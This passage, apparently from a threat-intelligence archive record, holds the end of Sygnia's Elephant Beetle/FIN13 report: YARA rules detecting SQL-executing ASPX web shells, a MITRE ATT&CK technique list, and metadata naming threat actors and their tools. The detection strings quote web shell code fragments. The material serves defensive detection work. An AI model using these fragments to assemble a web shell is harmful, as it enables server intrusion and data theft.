\"Response.Write\" wide ascii\n  condition:\n    ($param0 or $init0 or 1 of ($sql_conn_init*)) and 2 of ($exec*)\n}\n\n```\n\nASPX Web shell for SQL query execution\n\n```\nrule elephant_webshell_sql_aspx\n{\n  meta:\n    copyright = Sygnia\n    description = SQL Query Execution ASPX Web Shell\n    author = Amnon Kushnir\n    date = 03/06/2020\n  strings:\n    $import0 = \"Import Namespace=\\\"System.Data.SqlClient\\\"\" wide ascii\n    $format0 = \"<head><title>MSSQL</title></head>\" wide ascii\n    $param0 = \"Request.Form(\\\"constring\\\")\" wide ascii\n    $sql_conn_init1 = \"SqlConnection(Request.Form(\" wide ascii\n    $sql_conn_init2 = \"SqlCommand(Request.Form(\" wide ascii\n  condition:\n    (($import0 or $format0) and $param0) or 1 of ($sql_conn_init*)\n}\n\n```\n\n31\n\n\n-----\n\n### MITRE ATT&CK Breakdown\n\n**1.** Initial Access\n\nI. T1190       - Exploit Public-Facing Application\n\nII. T1078.001- Valid Accounts: Default Accounts\n\n**2.** Execution\n\nI. T1059 – Command and Scripting Interpreter\n\na. T1059.001 – PowerShell\n\nb. T1059.003 – Windows Command Shell\n\nc. T1059.004 – Unix Shell\n\nd. T1059.005 – Visual Basic\n\ne. T1059.006 – Python\n\nf. T1059.007 – JavaScript/JScript\n\nII. T1047 – Windows Management Instrumentation\n\n**3.** Persistence\n\nI. T1505 – Server Software Component\n\na. T1505.001 – SQL Stored Procedures\n\nb. T1505.003 – Web Shell\n\nII. T1136 – Create Account\n\n**4.** Privilege Escalation\n\nI. T1134      - Access Token Manipulation\n\nII. T1574.002      - Hijack Execution Flow: DLL Side-Loading\n\n**5.** Defense Evasion\n\nI. T1036 – Masquerading\n\na. T1036.003       - Rename System Utilities\n\nb. T1036.005       - Match Legitimate Name or Location\n\nII. T1564.001      - Hide Artifacts: Hidden Files and Directories\n\nIII. T1140     - Deobfuscate/Decode Files or Information\n\n**6.** Credential Access\n\nI. T1552.001      - Unsecured Credentials: Credentials in Files\n\nII. T1003      - OS Credential Dumping\n\na. T1003.001 – LSASS Memory\n\nb. T1003.001 – Security Account Manager\n\n**7.** Discovery\n\nI. T1046       - Network Service Scanning\n\nII. T1135       - Network Share Discovery\n\nIII. T1087.002       - Account Discovery: Domain Account\n\n**8.** Lateral Movement\n\nI. T1021.002      - Remote Services: SMB/Windows Admin Shares\n\nII. T1570      - Lateral Tool Transfer\n\n**9.** Collection\n\nI. T1560.001- Archive Collected Data: Archive via Utility\n\n**10.** Command and Control\n\nI. T1572      - Protocol Tunneling\n\nII. T1090.001      - Proxy: Internal Proxy\n\n\n32\n\n\n-----\n\nLearn more about Sygnia’s **Incident** **[Response](https://resources.sygnia.co/incident-response-digital-forensics)** **services.**\nTo talk to our experts about proactively building cyber resilience, please **[contact](https://www.sygnia.co/contact-us)** **us.**\n\n**About** **Sygnia**\n\nSygnia is a Team8 and Temasek company, part of the ISTARI Collective. Sygnia provides incident response and cyber security\nconsulting services, helping organizations worldwide to quickly contain and remediate attacks and proactively enhance their cyber\nresilience. The proven track record, commitment, and discretion have earned Sygnia the trust of security teams, senior executives, and\nmanagement boards at leading organizations worldwide including many of the Fortune 500 companies.\n\nFor more information:\n**[www.sygnia.co](http://www.sygnia.co/)**\n\n33\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf?__hstc=147695848.3e8f1a482c8f8d4531507747318e660b.1680005306711.1680005306711.1680005306711.1&__hssc=147695848.1.1680005306711&__hsfp=3000179024&hsCtaTracking=189ec409-ae2d-4909-8bf1-62dcdd694372%7Cca91d317-8f10-4a38-9f80-367f551ad64d"
    ],
    "report_names": [
        "Sygnia-%20Elephant%20Beetle_Jan2022.pdf?__hstc=147695848.3e8f1a482c8f8d4531507747318e660b.1680005306711.1680005306711.1680005306711.1&__hssc=147695848.1.1680005306711&__hsfp=3000179024&hsCtaTracking=189ec409-ae2d-4909-8bf1-62dcdd694372%7Cca91d317-8f10-4a38-9f80-367f551ad64d"
    ],
    "threat_actors": [
        {
            "id": "575d8adf-f451-4110-b1c0-89fb463e99c0",
            "created_at": "2022-10-25T16:07:23.637493Z",
            "updated_at": "2025-03-27T02:02:09.900204Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [],
            "source_name": "ETDA:FIN13",
            "tools": [
                "BLUEAGAVE",
                "BUSTEDPIPE",
                "CLOSEWATCH",
                "GetUserSPNS.vbs",
                "GoBot2",
                "HOTLANE",
                "JSPRAT",
                "MAILSLOT",
                "PowerSploit",
                "ProcDump",
                "SHELLSWEEP",
                "SIXPACK",
                "SPINOFF",
                "SWEARJAR",
                "Tiny SHell",
                "nmap",
                "tsh"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "50b43f44-b93c-4377-82bc-d6e9c7ef5ee6",
            "created_at": "2022-10-25T16:07:23.573424Z",
            "updated_at": "2025-03-27T02:02:09.872253Z",
            "deleted_at": null,
            "main_name": "Elephant Beetle",
            "aliases": [
                "TG2003"
            ],
            "source_name": "ETDA:Elephant Beetle",
            "tools": [
                "JSPSPY",
                "MiniWebCmdShell",
                "jsp File browser",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7aa1288a-61ec-4793-b543-9fedc26b9b03",
            "created_at": "2023-11-01T02:01:06.805323Z",
            "updated_at": "2025-03-27T02:00:55.555589Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "FIN13",
                "Elephant Beetle"
            ],
            "source_name": "MITRE:FIN13",
            "tools": [
                "Impacket",
                "Mimikatz",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f57e32ac-9f90-471d-93ba-7f6d8b05e6c1",
            "created_at": "2023-01-06T13:46:39.29882Z",
            "updated_at": "2025-03-27T02:00:03.044264Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "TG2003",
                "Elephant Beetle"
            ],
            "source_name": "MISPGALAXY:FIN13",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1698804364,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1698690823,
    "ts_modification_date": 1698690823,
    "files": {
        "pdf": "https://archive.orkl.eu/b91cbd9e6f39cecc89fce0e6aaed8cd9ace56a7c.pdf",
        "text": "https://archive.orkl.eu/b91cbd9e6f39cecc89fce0e6aaed8cd9ace56a7c.txt",
        "img": "https://archive.orkl.eu/b91cbd9e6f39cecc89fce0e6aaed8cd9ace56a7c.jpg"
    }
}